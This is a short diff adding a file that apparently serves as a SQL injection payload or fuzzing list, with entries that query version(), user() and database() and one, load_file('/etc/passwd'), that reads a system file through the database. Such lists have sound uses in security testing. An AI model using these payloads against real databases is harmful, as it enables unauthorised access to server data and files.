@@ -1,0 +1,5 @@
+
+version()
+user()
+database()
+load_file('/etc/passwd')
